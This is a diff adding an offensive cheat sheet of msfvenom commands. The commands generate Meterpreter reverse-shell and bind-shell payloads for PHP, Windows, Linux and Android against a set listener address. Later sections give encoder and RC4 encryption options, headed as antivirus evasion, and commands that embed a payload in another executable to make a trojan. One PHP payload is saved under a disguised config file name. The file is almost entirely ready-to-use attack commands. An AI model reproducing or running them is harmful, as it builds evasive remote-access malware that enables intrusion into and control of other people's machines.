@@ -1,0 +1,45 @@
+# MSFVenom payload Creation
+msfvenom -p payload options(encrypt/encode) -f elf/exe/raw -o file.exe/elf/php
+msfvenom -l payloads
+msfvenom -l archs
+msfvenom -l platforms
+msfvenom -l formats
+msfvenom -p payload -l options; to list the options for that payload
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.96.129 LPORT=9000 -f raw > config-v2.php
+
+
+
+#Payload for Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
+msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
+
+
+#Payload for Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.96.129 LPORT=9000 -f elf -o <fie_name>.elf
+
+
+#Payload for Android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.96.129 LPORT=9000 -o <fie_name>.apk
+
+
+
+
+
+#Evade Antivirus
+## Encoders
+msfvenom -l encoders
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
+
+
+## Encrypt
+msfvenom -l encrypt
+msfvenom -p windows/meterpreter/reverse_tcp --encrypt rc4 --encrypt-key <key> LHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
+
+
+
+
+# Injecting payload into something
+msfvenom -p windows/meterpreter/reverse_tcp -x <file in which to be embedded.extn> -k LHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -x <file in which to be embedded.extn> -k LHOST=192.168.96.129 LPORT=9000 -f exe -o <fie_name>.exe
